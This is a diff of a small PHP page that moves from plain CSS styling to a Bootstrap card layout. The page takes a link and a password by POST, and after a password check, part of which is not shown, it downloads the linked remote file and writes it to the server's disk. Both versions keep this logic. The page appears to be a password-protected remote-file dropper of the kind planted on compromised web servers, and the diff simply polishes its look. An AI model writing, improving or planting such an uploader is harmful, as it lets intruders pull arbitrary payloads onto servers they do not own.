@@ -1,74 +1,27 @@
-<html>
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>File Transfer</title>
-    <style type="text/css">
-        body {
-            background: #F6F6F6;
-            font-family: tahoma
-        }
-
-        form {
-            width: 400px;
-            margin: 11% auto;
-        }
-
-        form * {
-            float: left;
-        }
-
-        form label {
-            float: left;
-            width: 138px;
-        }
-
-        form input[type="text"] {
-            float: left;
-            margin-bottom: 11px;
-            width: 262px;
-            background: #B4B4B4;
-            padding: 3px 0;
-            border: none;
-            border-radius: 2px;
-            color: #000;
-            font: 11px tahoma;
-            padding-left: 5px;
-        }
-
-        form input[type="submit"] {
-            width: 100%;
-            background: rgb(29, 171, 26) none repeat scroll 0% 0%;
-            border-radius: 7px;
-            padding: 4px 0px;
-            border-width: medium medium 2px;
-            border-style: none none solid;
-            border-color: -moz-use-text-color -moz-use-text-color rgb(2, 78, 30);
-            -moz-border-top-colors: none;
-            -moz-border-right-colors: none;
-            -moz-border-bottom-colors: none;
-            -moz-border-left-colors: none;
-            border-image: none;
-            color: rgb(255, 255, 255);
-            cursor: pointer;
-        }
-
-        .error {
-            font: 11px tahoma;
-            color: #0575AA;
-            margin-top: 11px;
-            width: 100%;
-            text-align: center;
-        }
-    </style>
-
-<body>
-    <form action="" method="POST">
-        <label for="link">Link :</label> <input type="text" id="link" name="link"><br />
-        <label for="pass">Password :</label> <input type="text" size="30" id="pass" name="pass"><br />
-        <input type="submit" name="submit" value="Up">
-        <div class="error">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Upload</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<body class="d-flex justify-content-center align-items-center vh-100 bg-light">
+    <div class="card p-4 shadow-sm" style="width: 400px;">
+        <h4 class="text-center mb-3">Upload File</h4>
+        <form action="" method="POST">
+            <div class="mb-3">
+                <label for="link" class="form-label">Link:</label>
+                <input type="text" id="link" name="link" class="form-control" required>
+            </div>
+            <div class="mb-3">
+                <label for="pass" class="form-label">Password:</label>
+                <input type="text" id="pass" name="pass" class="form-control" required>
+            </div>
+            <button type="submit" name="submit" class="btn btn-primary w-100">Upload</button>
+        </form>
+        <div class="mt-3 text-center text-danger">
             <?php
-
             if (isset($_POST["pass"])) {
                 $pass = $_POST["pass"];
                 $link = $_POST["link"];
@@ -81,15 +34,14 @@
                         fwrite($lfile, fread($rfile, BUFSIZ), BUFSIZ);
                     fclose($rfile);
                     fclose($lfile);
-                    echo "File Uploaded";
+                    echo '<span class="text-success">File Uploaded Successfully!</span>';
                 } else {
-                    echo "Password is Not invalid !!";
+                    echo 'Password is Not valid!';
                 }
             }
             ?>
         </div>
-    </form><br />
-
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
-
 </html>
